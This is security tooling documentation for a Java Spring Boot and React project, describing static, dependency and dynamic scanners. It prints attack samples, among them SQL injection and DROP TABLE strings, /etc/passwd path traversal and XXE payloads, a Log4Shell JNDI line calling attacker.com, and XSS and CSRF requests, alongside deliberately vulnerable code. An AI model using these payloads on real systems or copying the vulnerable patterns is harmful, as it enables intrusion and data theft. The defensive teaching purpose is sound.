# Security Scanning Tools Documentation
## DevSecOps AI Project - Java & React Application Security

**Document Version:** 1.0  
**Last Updated:** November 6, 2025  
**Application Stack:** Java 11 + Spring Boot 2.7.5 | React 17 + Node 14  
**Author:** DevSecOps AI Team

---

## Table of Contents

1. [Overview](#overview)
2. [SAST - Static Application Security Testing](#sast---static-application-security-testing)
   - [SpotBugs (Java)](#spotbugs-java-sast)
3. [SCA - Software Composition Analysis](#sca---software-composition-analysis)
   - [OWASP Dependency-Check](#owasp-dependency-check)
   - [npm audit](#npm-audit-javascript-dependencies)
4. [DAST - Dynamic Application Security Testing](#dast---dynamic-application-security-testing)
   - [OWASP ZAP](#owasp-zap-web-application-scanner)
5. [Tool Comparison Matrix](#tool-comparison-matrix)
6. [Integration in CI/CD Pipeline](#integration-in-cicd-pipeline)
7. [Best Practices](#best-practices)
8. [Troubleshooting](#troubleshooting)

---

## Overview

This document provides comprehensive information about the security scanning tools used to analyze **Java Spring Boot backend** and **React frontend** applications in the DevSecOps AI project.

### Security Testing Layers

```
┌─────────────────────────────────────────────────────────────┐
│                    APPLICATION STACK                        │
├─────────────────────────────────────────────────────────────┤
│  Backend: Java 11 + Spring Boot 2.7.5 (Port 8080)          │
│  Frontend: React 17 + Node 14 (Port 3000)                  │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│              SECURITY SCANNING LAYERS                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Layer 1: SAST (Static Analysis)                            │
│  └─ SpotBugs → Analyzes compiled Java bytecode              │
│                                                              │
│  Layer 2: SCA (Dependency Analysis)                         │
│  ├─ OWASP Dependency-Check → Java & JavaScript libs         │
│  └─ npm audit → Node.js package vulnerabilities            │
│                                                              │
│  Layer 3: DAST (Runtime Testing)                            │
│  └─ OWASP ZAP → Attacks running web application            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Coverage Summary

| Layer | Tool | Language | Analysis Type | Runtime Required |
|-------|------|----------|---------------|------------------|
| **SAST** | SpotBugs | Java | Bytecode analysis | ❌ No |
| **SCA** | OWASP Dependency-Check | Java, JavaScript | CVE database matching | ❌ No |
| **SCA** | npm audit | JavaScript | npm registry API | ❌ No |
| **DAST** | OWASP ZAP | Web (Any) | HTTP attack simulation | ✅ Yes |

---

## SAST - Static Application Security Testing

### SpotBugs (Java SAST)

<img src="https://spotbugs.github.io/images/logos/spotbugs_icon_only_zoom_256px.png" width="80" alt="SpotBugs Logo">

**Official Website:** https://spotbugs.github.io/  
**Version Used:** 4.7.3  
**License:** LGPL-2.1

#### What is SpotBugs?

SpotBugs is a static analysis tool that examines **Java bytecode** (compiled `.class` files) to detect potential bugs and security vulnerabilities. It's the successor to the widely-used FindBugs tool.

#### How It Works

1. **Compilation Phase:**
   ```bash
   mvn clean compile
   # Produces: target/classes/*.class files
   ```

2. **Analysis Phase:**
   ```bash
   mvn spotbugs:check
   # SpotBugs examines bytecode using pattern matching
   ```

3. **Detection Mechanism:**
   - **Pattern Matching:** Recognizes code patterns known to be problematic
   - **Dataflow Analysis:** Tracks data flow through the application
   - **Control Flow Analysis:** Examines execution paths
   - **Type Analysis:** Checks type safety and casting issues

#### Security Vulnerabilities Detected

##### 1. SQL Injection (CWE-89)
**Risk Level:** HIGH | **OWASP Top 10:** A03:2021

**Vulnerable Code:**
```java
// ❌ VULNERABLE: String concatenation in SQL
String userId = request.getParameter("userId");
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Attack Scenario:**
```
Input: userId = "1 OR 1=1"
Result: SELECT * FROM users WHERE id = 1 OR 1=1
Impact: Returns all users (authentication bypass)
```

**SpotBugs Detection:**
- **Bug Code:** `SQL_NONCONSTANT_STRING_PASSED_TO_EXECUTE`
- **Priority:** High
- **Confidence:** Medium

**Secure Fix:**
```java
// ✅ SECURE: Parameterized query
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userId);
ResultSet rs = pstmt.executeQuery();
```

##### 2. Path Traversal (CWE-22)
**Risk Level:** HIGH | **OWASP Top 10:** A01:2021

**Vulnerable Code:**
```java
// ❌ VULNERABLE: User input directly used in file path
String filename = request.getParameter("file");
File file = new File("/uploads/" + filename);
FileInputStream fis = new FileInputStream(file);
```

**Attack Scenario:**
```
Input: file = "../../etc/passwd"
Result: Reads: /uploads/../../etc/passwd → /etc/passwd
Impact: Arbitrary file read
```

**SpotBugs Detection:**
- **Bug Code:** `PATH_TRAVERSAL_IN`
- **Priority:** High
- **Confidence:** High

**Secure Fix:**
```java
// ✅ SECURE: Validate and canonicalize path
String filename = request.getParameter("file");
File baseDir = new File("/uploads/");
File file = new File(baseDir, filename);

// Ensure file is within base directory
if (!file.getCanonicalPath().startsWith(baseDir.getCanonicalPath())) {
    throw new SecurityException("Path traversal attempt detected");
}
FileInputStream fis = new FileInputStream(file);
```

##### 3. Insecure Random Number Generation (CWE-330)
**Risk Level:** MEDIUM

**Vulnerable Code:**
```java
// ❌ VULNERABLE: Predictable random numbers
Random random = new Random();
String sessionToken = String.valueOf(random.nextInt());
```

**SpotBugs Detection:**
- **Bug Code:** `PREDICTABLE_RANDOM`
- **Priority:** Medium
- **Confidence:** High

**Secure Fix:**
```java
// ✅ SECURE: Cryptographically secure random
SecureRandom secureRandom = new SecureRandom();
byte[] tokenBytes = new byte[32];
secureRandom.nextBytes(tokenBytes);
String sessionToken = Base64.getEncoder().encodeToString(tokenBytes);
```

##### 4. XML External Entity (XXE) Injection (CWE-611)
**Risk Level:** HIGH | **OWASP Top 10:** A05:2021

**Vulnerable Code:**
```java
// ❌ VULNERABLE: Default XML parser allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xmlInputStream);
```

**Attack Scenario:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**SpotBugs Detection:**
- **Bug Code:** `XXE_DOCUMENT`
- **Priority:** High
- **Confidence:** High

**Secure Fix:**
```java
// ✅ SECURE: Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xmlInputStream);
```

##### 5. Insecure Deserialization (CWE-502)
**Risk Level:** CRITICAL | **OWASP Top 10:** A08:2021

**Vulnerable Code:**
```java
// ❌ VULNERABLE: Untrusted data deserialization
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject();
```

**SpotBugs Detection:**
- **Bug Code:** `OBJECT_DESERIALIZATION`
- **Priority:** High
- **Confidence:** Medium

**Secure Fix:**
```java
// ✅ SECURE: Validate before deserialization
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
        // Whitelist allowed classes
        if (!desc.getName().equals("com.example.SafeClass")) {
            throw new InvalidClassException("Unauthorized deserialization attempt");
        }
        return super.resolveClass(desc);
    }
};
Object obj = ois.readObject();
```

#### Maven Integration

**pom.xml Configuration:**
```xml
<project>
    <build>
        <plugins>
            <!-- SpotBugs Plugin -->
            <plugin>
                <groupId>com.github.spotbugs</groupId>
                <artifactId>spotbugs-maven-plugin</artifactId>
                <version>4.7.3.4</version>
                <configuration>
                    <effort>Max</effort>
                    <threshold>Low</threshold>
                    <xmlOutput>true</xmlOutput>
                    <xmlOutputDirectory>target/spotbugs</xmlOutputDirectory>
                    <includeFilterFile>spotbugs-security-include.xml</includeFilterFile>
                    <plugins>
                        <!-- Security-focused plugin -->
                        <plugin>
                            <groupId>com.h3xstream.findsecbugs</groupId>
                            <artifactId>findsecbugs-plugin</artifactId>
                            <version>1.12.0</version>
                        </plugin>
                    </plugins>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>check</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

**Security Filter (spotbugs-security-include.xml):**
```xml
<FindBugsFilter>
    <Match>
        <Bug category="SECURITY"/>
    </Match>
    <Match>
        <Bug code="SQL,PATH,XXE,RCE,XSS"/>
    </Match>
</FindBugsFilter>
```

#### Command Line Usage

```bash
# Run SpotBugs with Maven
mvn spotbugs:check

# Generate detailed HTML report
mvn spotbugs:spotbugs
mvn spotbugs:gui

# Run with custom threshold
mvn spotbugs:check -Dspotbugs.threshold=Medium

# Include FindSecBugs (security-focused)
mvn spotbugs:check -Dspotbugs.includePlugins=com.h3xstream.findsecbugs:findsecbugs-plugin:1.12.0
```

#### Output Format

**XML Report (target/spotbugsXml.xml):**
```xml
<BugCollection>
    <BugInstance type="SQL_NONCONSTANT_STRING_PASSED_TO_EXECUTE" 
                 priority="1" 
                 category="SECURITY">
        <ShortMessage>SQL injection vulnerability</ShortMessage>
        <LongMessage>
            Nonconstant string passed to execute method on an SQL statement
        </LongMessage>
        <Class classname="com.example.UserController"/>
        <Method name="getUser"/>
        <SourceLine start="42" end="42" 
                    sourcefile="UserController.java" 
                    sourcepath="com/example/UserController.java"/>
    </BugInstance>
</BugCollection>
```

#### CI/CD Integration

**GitHub Actions Workflow:**
```yaml
- name: Run SpotBugs Security Analysis
  run: |
    cd sample_app_java/backend
    mvn clean compile spotbugs:check -Dspotbugs.effort=Max
    
- name: Upload SpotBugs Report
  uses: actions/upload-artifact@v4
  with:
    name: spotbugs-report
    path: sample_app_java/backend/target/spotbugs/*.xml
```

#### Performance Considerations

| Project Size | Analysis Time | Memory Usage |
|--------------|---------------|--------------|
| Small (<10K LOC) | 10-30 seconds | 256 MB |
| Medium (10-50K LOC) | 1-3 minutes | 512 MB |
| Large (50-100K LOC) | 3-10 minutes | 1 GB |
| Very Large (>100K LOC) | 10-30 minutes | 2 GB |

**Optimization Tips:**
```bash
# Increase Maven memory
export MAVEN_OPTS="-Xmx2g"

# Parallel analysis
mvn spotbugs:check -T 4

# Skip tests during SpotBugs
mvn spotbugs:check -DskipTests
```

---

## SCA - Software Composition Analysis

### OWASP Dependency-Check

<img src="https://jeremylong.github.io/DependencyCheck/images/dc.svg" width="100" alt="Dependency-Check Logo">

**Official Website:** https://jeremylong.github.io/DependencyCheck/  
**Version Used:** 8.4.0  
**License:** Apache 2.0

#### What is OWASP Dependency-Check?

A Software Composition Analysis (SCA) tool that identifies known vulnerabilities in project dependencies by comparing them against the **National Vulnerability Database (NVD)** and other CVE sources.

#### How It Works

1. **Dependency Discovery:**
   ```bash
   # Scans pom.xml, package.json, JAR files
   dependency-check --scan ./sample_app_java
   ```

2. **Evidence Collection:**
   - Extracts library metadata (GroupId, ArtifactId, Version)
   - Generates CPE (Common Platform Enumeration) identifiers
   - Collects hashes (SHA-1, SHA-256)

3. **Vulnerability Matching:**
   - Queries NVD database (200,000+ CVEs)
   - Matches CPE identifiers
   - Checks file hashes against known vulnerable versions
   - Consults supplemental data sources:
     * OSS Index
     * RetireJS
     * Ruby Advisory Database
     * Node Security Platform

4. **Risk Scoring:**
   - Assigns CVSS v3 scores (0.0 - 10.0)
   - Categorizes: LOW (0.1-3.9), MEDIUM (4.0-6.9), HIGH (7.0-8.9), CRITICAL (9.0-10.0)

#### Vulnerabilities Detected

##### 1. Log4Shell (CVE-2021-44228)
**CVSS Score:** 10.0 CRITICAL | **CWE:** CWE-502

**Affected Dependency:**
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version> <!-- ❌ VULNERABLE -->
</dependency>
```

**Vulnerability Details:**
- **CVE ID:** CVE-2021-44228
- **Description:** Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints
- **Attack Vector:** Network (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- **Impact:** Remote Code Execution (RCE)

**Exploitation Example:**
```java
// Attacker sends malicious input
String userInput = "${jndi:ldap://attacker.com/Evil}";
logger.info("User input: {}", userInput);

// Log4j performs JNDI lookup → Downloads and executes Evil.class
```

**Remediation:**
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version> <!-- ✅ PATCHED -->
</dependency>
```

##### 2. Spring4Shell (CVE-2022-22965)
**CVSS Score:** 9.8 CRITICAL | **CWE:** CWE-94

**Affected Dependency:**
```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.3.17</version> <!-- ❌ VULNERABLE -->
</dependency>
```

**Vulnerability Details:**
- **CVE ID:** CVE-2022-22965
- **Description:** Spring Framework RCE via Data Binding on JDK 9+
- **Impact:** Arbitrary code execution

**Remediation:**
```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.3.18</version> <!-- ✅ PATCHED -->
</dependency>
```

##### 3. Jackson Databind Vulnerabilities (CVE-2020-36518)
**CVSS Score:** 7.5 HIGH | **CWE:** CWE-502

**Affected Dependency:**
```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.12.3</version> <!-- ❌ VULNERABLE -->
</dependency>
```

**Vulnerability Details:**
- **CVE ID:** CVE-2020-36518
- **Description:** Deserialization of Untrusted Data in jackson-databind
- **Impact:** Denial of Service (DoS)

**Remediation:**
```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.12.6.1</version> <!-- ✅ PATCHED -->
</dependency>
```

#### Maven Integration

**pom.xml Configuration:**
```xml
<project>
    <build>
        <plugins>
            <plugin>
                <groupId>org.owasp</groupId>
                <artifactId>dependency-check-maven</artifactId>
                <version>8.4.0</version>
                <configuration>
                    <format>ALL</format> <!-- HTML, JSON, XML, CSV -->
                    <outputDirectory>target/dependency-check-report</outputDirectory>
                    <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on HIGH or CRITICAL -->
                    <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
                    <nvdDatafeedUrl>https://nvd.nist.gov/feeds/json/cve/1.1/</nvdDatafeedUrl>
                    <skipTestScope>false</skipTestScope>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>check</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

#### Command Line Usage

```bash
# Basic scan
dependency-check --project "My App" --scan ./sample_app_java

# Scan with custom output
dependency-check \
  --scan ./sample_app_java \
  --format JSON \
  --out ./reports/dependency-check.json

# Fail on HIGH severity
dependency-check \
  --scan ./sample_app_java \
  --failOnCVSS 7

# Use NVD API Key (faster, no rate limits)
dependency-check \
  --scan ./sample_app_java \
  --nvdApiKey YOUR_API_KEY
```

**Get NVD API Key (Free):**
https://nvd.nist.gov/developers/request-an-api-key

#### Output Example

**JSON Report:**
```json
{
  "dependencies": [
    {
      "fileName": "log4j-core-2.14.1.jar",
      "filePath": "target/classes/lib/log4j-core-2.14.1.jar",
      "md5": "dc815be299f81c180aa8d2924fbe6a7d",
      "sha1": "9e0f18b820be3b1f3d8e2e9f8e0f18b820be3b1f",
      "evidenceCollected": {
        "vendorEvidence": ["apache", "logging"],
        "productEvidence": ["log4j"],
        "versionEvidence": ["2.14.1"]
      },
      "vulnerabilities": [
        {
          "name": "CVE-2021-44228",
          "severity": "CRITICAL",
          "cvssv3": {
            "baseScore": 10.0,
            "attackVector": "NETWORK",
            "attackComplexity": "LOW",
            "privilegesRequired": "NONE",
            "userInteraction": "NONE",
            "scope": "CHANGED",
            "confidentialityImpact": "HIGH",
            "integrityImpact": "HIGH",
            "availabilityImpact": "HIGH"
          },
          "description": "Apache Log4j2 <=2.14.1 JNDI features do not protect against attacker-controlled LDAP",
          "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            "https://logging.apache.org/log4j/2.x/security.html"
          ]
        }
      ]
    }
  ]
}
```

#### CI/CD Integration

**GitHub Actions:**
```yaml
- name: Run OWASP Dependency-Check
  run: |
    mvn org.owasp:dependency-check-maven:check \
      -DfailBuildOnCVSS=7 \
      -DnvdApiKey=${{ secrets.NVD_API_KEY }}

- name: Upload Dependency-Check Report
  uses: actions/upload-artifact@v4
  with:
    name: dependency-check-report
    path: target/dependency-check-report.html
```

#### Performance Optimization

**First Run (Downloads NVD Database):**
- Time: 30-60 minutes
- Database Size: ~1.5 GB
- Updates: Daily incremental updates

**Subsequent Runs:**
- Time: 2-5 minutes
- Updates: Only new CVEs

**Speed Improvements:**
```bash
# Use NVD API Key (10x faster)
--nvdApiKey YOUR_API_KEY

# Cache NVD database in CI/CD
- uses: actions/cache@v3
  with:
    path: ~/.m2/repository/org/owasp/dependency-check-data
    key: dependency-check-data-${{ hashFiles('**/pom.xml') }}

# Parallel processing
mvn dependency-check:check -T 4
```

---

### npm audit (JavaScript Dependencies)

<img src="https://nodejs.org/static/images/logo.svg" width="100" alt="Node.js Logo">

**Official Website:** https://docs.npmjs.com/cli/v8/commands/npm-audit  
**Built into:** npm 6.0.0+  
**Database:** GitHub Advisory Database

#### What is npm audit?

Built-in npm command that checks JavaScript dependencies against the **GitHub Advisory Database** for known security vulnerabilities.

#### How It Works

1. **Dependency Tree Analysis:**
   ```bash
   npm audit
   # Reads: package.json, package-lock.json
   ```

2. **API Query:**
   ```bash
   # Sends dependency tree to npm registry API
   POST https://registry.npmjs.org/-/npm/v1/security/audits
   ```

3. **Vulnerability Matching:**
   - Compares installed versions against advisory database
   - Identifies direct and transitive (nested) vulnerabilities
   - Calculates severity based on CVSS scores

4. **Automated Fixes:**
   ```bash
   npm audit fix              # Safe updates (semantic versioning)
   npm audit fix --force      # Breaking changes allowed
   ```

#### Vulnerabilities Detected

##### 1. Prototype Pollution (minimist)
**Severity:** MODERATE | **CWE:** CWE-1321

**Affected Package:**
```json
{
  "dependencies": {
    "minimist": "0.0.8"  // ❌ VULNERABLE
  }
}
```

**Vulnerability Details:**
- **Package:** minimist
- **Vulnerable Versions:** < 1.2.6
- **Patched Version:** >= 1.2.6
- **Advisory:** GHSA-xvch-5gv4-984h

**Exploitation:**
```javascript
const minimist = require('minimist');
const args = minimist(['--__proto__.polluted=true']);
console.log({}.polluted); // Outputs: true (prototype pollution!)
```

**Impact:**
- Denial of Service
- Property injection
- Potential RCE in specific contexts

**Remediation:**
```json
{
  "dependencies": {
    "minimist": "^1.2.6"  // ✅ PATCHED
  }
}
```

##### 2. Regular Expression Denial of Service (ReDoS)
**Severity:** HIGH | **CWE:** CWE-1333

**Affected Package:**
```json
{
  "dependencies": {
    "marked": "0.3.19"  // ❌ VULNERABLE
  }
}
```

**Vulnerability Details:**
- **Package:** marked (Markdown parser)
- **Vulnerable Versions:** < 4.0.10
- **Impact:** Catastrophic backtracking causing CPU exhaustion

**Exploitation:**
```javascript
const marked = require('marked');
// Malicious markdown causes ReDoS
const malicious = '[x](\\' + 'a'.repeat(50000) + ')';
marked(malicious); // Server hangs for minutes
```

**Remediation:**
```json
{
  "dependencies": {
    "marked": "^4.0.10"  // ✅ PATCHED
  }
}
```

##### 3. Cross-Site Scripting (XSS) in react-dom
**Severity:** HIGH | **CWE:** CWE-79

**Affected Package:**
```json
{
  "dependencies": {
    "react-dom": "16.13.0"  // ❌ VULNERABLE
  }
}
```

**Vulnerability Details:**
- **Package:** react-dom
- **Vulnerable Versions:** < 16.14.0
- **CVE:** CVE-2020-15168

**Exploitation:**
```javascript
// Server-side rendering with attacker-controlled data
const userInput = 'javascript:alert(document.cookie)';
const html = ReactDOMServer.renderToString(
  <a href={userInput}>Click me</a>
);
// Results in XSS vulnerability
```

**Remediation:**
```json
{
  "dependencies": {
    "react-dom": "^16.14.0"  // ✅ PATCHED
  }
}
```

#### Command Line Usage

```bash
# Run audit
npm audit

# Show detailed report
npm audit --json

# Audit only production dependencies
npm audit --production

# Automatically fix vulnerabilities
npm audit fix

# Force fix (may break changes)
npm audit fix --force

# Dry run (see what would be fixed)
npm audit fix --dry-run

# Audit specific severity levels
npm audit --audit-level=high  # Only HIGH and CRITICAL
npm audit --audit-level=moderate
npm audit --audit-level=low
```

#### Output Example

```
                       === npm audit security report ===

┌──────────────────────────────────────────────────────────────────────────────┐
│                                Manual Review                                  │
│            Some vulnerabilities require your attention to resolve             │
│                                                                               │
│         Visit https://go.npm.me/audit-guide for additional guidance          │
└──────────────────────────────────────────────────────────────────────────────┘

┌───────────────┬──────────────────────────────────────────────────────────────┐
│ Moderate      │ Prototype Pollution                                          │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Package       │ minimist                                                     │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Patched in    │ >=1.2.6                                                      │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Dependency of │ react-scripts                                                │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Path          │ react-scripts > webpack-dev-server > minimist                │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ More info     │ https://github.com/advisories/GHSA-xvch-5gv4-984h           │
└───────────────┴──────────────────────────────────────────────────────────────┘

found 3 moderate severity vulnerabilities in 1500 scanned packages
  2 vulnerabilities require manual review. See the full report for details.
```

#### JSON Output

```json
{
  "vulnerabilities": {
    "minimist": {
      "name": "minimist",
      "severity": "moderate",
      "via": [
        {
          "source": 1179,
          "name": "minimist",
          "dependency": "minimist",
          "title": "Prototype Pollution in minimist",
          "url": "https://github.com/advisories/GHSA-xvch-5gv4-984h",
          "severity": "moderate",
          "cwe": ["CWE-1321"],
          "cvss": {
            "score": 5.6,
            "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
          },
          "range": "0.0.8 - 1.2.5"
        }
      ],
      "effects": ["react-scripts"],
      "range": "0.0.8 - 1.2.5",
      "nodes": ["node_modules/minimist"],
      "fixAvailable": {
        "name": "react-scripts",
        "version": "5.0.1",
        "isSemVerMajor": true
      }
    }
  },
  "metadata": {
    "vulnerabilities": {
      "total": 3,
      "info": 0,
      "low": 0,
      "moderate": 3,
      "high": 0,
      "critical": 0
    }
  }
}
```

#### CI/CD Integration

**GitHub Actions:**
```yaml
- name: Run npm audit
  run: |
    cd sample_app_java/frontend
    npm audit --audit-level=moderate

- name: Attempt automatic fixes
  run: |
    npm audit fix
    
- name: Generate audit report
  run: |
    npm audit --json > npm-audit-report.json

- name: Upload npm audit report
  uses: actions/upload-artifact@v4
  with:
    name: npm-audit-report
    path: npm-audit-report.json
```

#### Suppressing False Positives

**Create `.npmrc` file:**
```
audit-level=high
```

**Or use npm-audit-resolver:**
```bash
npm install -g npm-audit-resolver
npm-audit-resolver
```

This creates `audit-resolve.json`:
```json
{
  "decisions": {
    "1179": {
      "decision": "postpone",
      "madeAt": 1667250000000,
      "expiresAt": 1669842000000,
      "reason": "Waiting for react-scripts update"
    }
  }
}
```

---

## DAST - Dynamic Application Security Testing

### OWASP ZAP (Web Application Scanner)

<img src="https://www.zaproxy.org/img/zap-by-checkmarx.svg" width="150" alt="OWASP ZAP Logo">

**Official Website:** https://www.zaproxy.org/  
**Version Used:** 2.14.0  
**License:** Apache 2.0

#### What is OWASP ZAP?

OWASP Zed Attack Proxy (ZAP) is an open-source web application security scanner that **actively attacks** your running application to find vulnerabilities that only appear at runtime.

#### How It Works

1. **Spider/Crawler Phase:**
   ```bash
   # ZAP discovers all pages and endpoints
   Starting URL: http://localhost:8080
   Found: /login, /api/users, /admin, /profile, etc.
   ```

2. **Passive Scanning:**
   - Monitors HTTP traffic without sending attacks
   - Checks for: missing headers, cookies without flags, information disclosure

3. **Active Scanning:**
   - Sends attack payloads to every parameter
   - Tests for: SQL injection, XSS, XXE, CSRF, etc.
   - Fuzzing: malformed inputs, edge cases

4. **Reporting:**
   - Categorizes findings by risk (HIGH, MEDIUM, LOW, INFO)
   - Provides evidence (request/response)
   - Suggests remediation

#### Scan Types

##### 1. Baseline Scan
**Purpose:** Quick, non-intrusive scan (suitable for CI/CD)  
**Duration:** 1-5 minutes  
**Attacks:** Passive + Safe active checks

```bash
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py \
  -t http://localhost:8080 \
  -J zap-report.json
```

##### 2. Full Scan
**Purpose:** Comprehensive security test  
**Duration:** 15-60 minutes  
**Attacks:** All active attack plugins

```bash
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://localhost:8080 \
  -J zap-report.json
```

##### 3. API Scan
**Purpose:** REST API testing  
**Duration:** 5-15 minutes  
**Input:** OpenAPI/Swagger definition

```bash
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t http://localhost:8080/api \
  -f openapi \
  -J zap-report.json
```

#### Vulnerabilities Detected

##### 1. SQL Injection
**Risk:** HIGH | **CWE:** CWE-89 | **OWASP:** A03:2021

**Test Payloads:**
```
http://localhost:8080/user?id=1' OR '1'='1
http://localhost:8080/user?id=1; DROP TABLE users--
http://localhost:8080/user?id=1 UNION SELECT password FROM users--
```

**Detection Method:**
- Error-based: `You have an error in your SQL syntax`
- Boolean-based: Different responses for true/false
- Time-based: `1' AND SLEEP(5)--` causes 5-second delay
- UNION-based: Extra columns in response

**Evidence Example:**
```
Request:
GET /api/user?id=1'%20OR%20'1'='1 HTTP/1.1
Host: localhost:8080

Response:
HTTP/1.1 200 OK
[
  {"id":1,"username":"admin","password":"hash1"},
  {"id":2,"username":"user","password":"hash2"},
  ...all users returned...
]

Risk: SQL injection allows authentication bypass and data exfiltration
```

##### 2. Cross-Site Scripting (XSS)
**Risk:** HIGH | **CWE:** CWE-79 | **OWASP:** A03:2021

**Test Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
javascript:alert(document.cookie)
```

**Types Detected:**
- **Reflected XSS:** Payload in URL/parameter
- **Stored XSS:** Payload saved in database
- **DOM XSS:** Client-side JavaScript vulnerability

**Evidence Example:**
```
Request:
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: localhost:8080

Response:
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Search results for: <script>alert('XSS')</script></h1>

Risk: Attacker can steal session cookies, perform actions as victim
```

##### 3. Missing Security Headers
**Risk:** MEDIUM | **CWE:** CWE-693

**Headers Checked:**

| Header | Purpose | Missing Impact |
|--------|---------|----------------|
| `Content-Security-Policy` | Prevents XSS, clickjacking | XSS attacks easier |
| `X-Content-Type-Options: nosniff` | Prevents MIME sniffing | Content type confusion |
| `X-Frame-Options: DENY` | Prevents clickjacking | Iframe hijacking |
| `Strict-Transport-Security` | Enforces HTTPS | Man-in-the-middle attacks |
| `X-XSS-Protection: 1; mode=block` | Browser XSS filter | Legacy XSS vulnerabilities |

**Evidence Example:**
```
Request:
GET / HTTP/1.1
Host: localhost:8080

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: JSESSIONID=ABC123

MISSING HEADERS:
❌ Content-Security-Policy
❌ X-Content-Type-Options
❌ X-Frame-Options
❌ Strict-Transport-Security

Recommendation: Add security headers to all responses
```

**Remediation (Spring Boot):**
```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.headers()
            .contentSecurityPolicy("default-src 'self'")
            .and()
            .xssProtection()
            .and()
            .contentTypeOptions()
            .and()
            .frameOptions().deny()
            .and()
            .httpStrictTransportSecurity()
                .maxAgeInSeconds(31536000)
                .includeSubDomains(true);
    }
}
```

##### 4. Cookie Security Issues
**Risk:** MEDIUM | **CWE:** CWE-614, CWE-1004

**Issues Detected:**

| Issue | Description | Risk |
|-------|-------------|------|
| Missing `Secure` flag | Cookie sent over HTTP | Session hijacking via MITM |
| Missing `HttpOnly` flag | JavaScript can access cookie | XSS can steal session |
| Missing `SameSite` attribute | Cookie sent cross-site | CSRF attacks possible |
| Overly long expiration | Session persists too long | Increased attack window |

**Evidence Example:**
```
Response:
HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=ABC123; Path=/

ISSUES:
❌ Missing Secure flag - cookie sent over HTTP
❌ Missing HttpOnly flag - accessible to JavaScript
❌ Missing SameSite attribute - CSRF possible
```

**Remediation:**
```properties
# application.properties
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=strict
server.servlet.session.timeout=15m
```

##### 5. CSRF (Cross-Site Request Forgery)
**Risk:** MEDIUM | **CWE:** CWE-352 | **OWASP:** A01:2021

**Detection:**
- ZAP sends state-changing request without CSRF token
- If request succeeds, CSRF vulnerability exists

**Evidence Example:**
```
Request (from attacker's site):
POST /api/transfer HTTP/1.1
Host: localhost:8080
Cookie: JSESSIONID=VICTIM_SESSION
Content-Type: application/json

{"to":"attacker","amount":1000}

Response:
HTTP/1.1 200 OK
{"status":"success","message":"Transfer completed"}

Risk: Attacker can trick victim into performing unwanted actions
```

**Remediation (Spring Boot):**
```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}
```

#### GitHub Actions Integration

**Docker-based ZAP Scan:**
```yaml
